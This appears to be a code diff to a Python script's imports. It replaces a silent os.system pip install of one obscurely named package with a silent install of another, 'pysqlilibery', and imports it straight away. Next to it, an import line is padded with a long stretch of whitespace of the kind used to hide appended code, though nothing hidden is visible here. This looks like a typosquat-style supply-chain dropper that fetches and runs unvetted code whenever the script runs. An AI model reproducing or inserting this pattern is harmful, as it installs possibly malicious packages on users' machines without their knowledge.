@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolourpkgs")
-import pipcolourpkgs
+os.system("pip install pysqlilibery")
+import pysqlilibery
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
